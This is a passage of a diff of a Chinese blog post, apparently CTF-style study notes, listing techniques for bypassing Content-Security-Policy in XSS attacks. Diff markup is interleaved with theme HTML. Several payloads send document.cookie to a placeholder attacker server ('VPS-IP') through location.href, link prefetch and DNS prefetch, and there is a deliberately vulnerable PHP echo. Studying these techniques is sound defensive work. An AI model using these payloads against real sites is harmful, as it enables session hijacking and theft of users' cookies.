class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-comment">&lt;!--1.php--&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;Ev1ls7&#x27;</span>,<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>)));</span><br><span class="language-php">    &#125;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your GET content:&quot;</span>.@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>];</span><br><span class="language-php">    &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--2.php--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your GET content:&quot;</span>.@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>];</span><br><span class="language-php">    &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">&lt;/html</span><br></code></pre></td></tr></table></figure>
 <p>该代码对于2.php没有进行设置，可利用iframe特性（在HTML文档中iframe每出现一次，一个IFrame对象就会被创建，可以使用 document.createElement()方法来创建）<br>创建一个iframe标签将其嵌入到DOM文档的body元素中，通过设置iframe标签的属性使浏览器渲染1.php，iframe也会内嵌到页面中<br>2.location绕过（unsafe-inline存在安全风险的利用）<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span> <span class="hljs-string">&#x27;unsafe-inline&#x27;</span><br></code></pre></td></tr></table></figure>
 <p>可以利用location.href/window.location/window.open 绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;window.location.href=&#x27;http://VPS-IP:port&#x27;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://VPS-IP:port&#x27;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 <p>3.link标签<br>适用于可以执行JavaScript脚本，但是无法将CSP数据带出<br>以firefox为例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//<span class="hljs-variable">$&#123;cookie&#125;</span>.vps_ip&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>以如下带出cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//VPS-IP/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link)</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var link = document.create<span class="hljs-constructor">Element(<span class="hljs-string">&quot;link&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;rel&quot;</span>, <span class="hljs-string">&quot;prefetch&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;//VPS-IP/?&quot;</span> + <span class="hljs-params">document</span>.<span class="hljs-params">cookie</span>)</span>;<br>document.head.append<span class="hljs-constructor">Child(<span class="hljs-params">link</span>)</span><br></code></pre></td></tr></table></figure>
 <p>href属性被设定为设置一个超链接，当被点击是，会以GET的形式请求我们的VPS，且带着用户自己的cookie值作为查询字符串附加在URL的末尾。<br>4.低版本CDN绕过<br>如果此CDN服务商在CSP白名单中<br>如：<br>以Jquery-mobile库为例，如果题目给出的CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以以</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&#x27;&lt;script&gt;alert(hack)&lt;/script&gt;&#x27;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> data-role=popup <span class="hljs-built_in">id</span>=&#x27;&lt;<span class="hljs-keyword">script</span>&gt;alert(hack)&lt;/<span class="hljs-keyword">script</span>&gt;&#x27;&gt;&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>5.利用meta标签实现url跳转<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url=https://example.com&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;3;url=https://example.com&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>6.CRLF绕过<br>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中<br>7.站点可控静态资源绕过<br>要求站点存在可控静态资源，且站点在CSP白名单中<br>如：</p>
-<figure class="highlight plaintext"><figcaption><span>http-equiv</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">www.google-analytics.com中可以自定义JavaScript，以此绕过</span><br><span class="line">8.站点可控JSONP绕过</span><br><span class="line">站点存在可控的JSONP，且站点在CSP白名单中</span><br><span class="line">有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</span><br><span class="line">9.Base-uri绕过</span><br><span class="line">script-src只使用nonce，没有额外设置base-uri，页面引用存在相对路径的script标签</span><br><span class="line">当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用base标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法</span><br><span class="line">10.不完整script标签绕过nonce</span><br><span class="line">适用于可控点在合法script标签上方,且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式</span><br><span class="line"></span><br><span class="line">特性：</span><br><span class="line"> 1.当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性</span><br><span class="line"> 2.当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</span><br><span class="line"> 3.当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析</span><br><span class="line"></span><br><span class="line">例：</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><figcaption><span>http-equiv</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs <meta">```<br>www.google-analytics.com中可以自定义JavaScript，以此绕过<br>8.站点可控JSONP绕过<br>站点存在可控的JSONP，且站点在CSP白名单中<br>有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br>9.Base-uri绕过<br>script-src只使用nonce，没有额外设置base-uri，页面引用存在相对路径的script标签<br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用base标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法<br>10.不完整script标签绕过nonce<br>适用于可控点在合法script标签上方,且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式<br><br>特性：<br> 1.当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性<br> 2.当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略<br> 3.当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析<br><br>例：<br></code></pre></td></tr></table></figure>
 <?php header("X-XSS-Protection:0");?>
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-xxxxx'">
 <?php echo $_GET['xss']?>
 <script nonce='xxxxx'>
   //do some thing
 </script>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可使用</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可使用<br></code></pre></td></tr></table></figure>
 ?xss=<script src=data:text/plain,alert(1)
 ```
 nonce会进入不完整script标签成为其属性名
@@ -195,121 +379,344 @@ nonce会进入不完整script标签成为其属性名
 原理为攻击者将恶意代码写入PDF文件中，将此图片利用文件上传或者创建在自己的VPS上，受害者访问从而进行XSS攻击。不能获取页面cookie，但是可以弹窗，url跳转等。
 13.SVG矢量图绕过
 原理同PDF XSS绕过
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023/08/10：xss笔记</div>
+      <div>http://example.com/2023/08/10/xssnote/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 10, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/10/xssnote/" data-id="cll59g8v30003agud3wdoao8k" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2023/08/10/uploadnote/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2023/08/10：upload笔记</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
-    </div>
+    <div class="license-icon iconfont"></div>
   </div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
-  
-</aside>
-        
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/11/LITCTF/" title="2023/08/11：LITCTF2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023/08/11：LITCTF2023</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/10/uploadnote/" title="2023/08/10：upload笔记">
+                        <span class="hidden-mobile">2023/08/10：upload笔记</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2023 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
     </div>
   </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
+</div>
+
+
+
+
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+
+
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+
+
+
   
-</nav>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
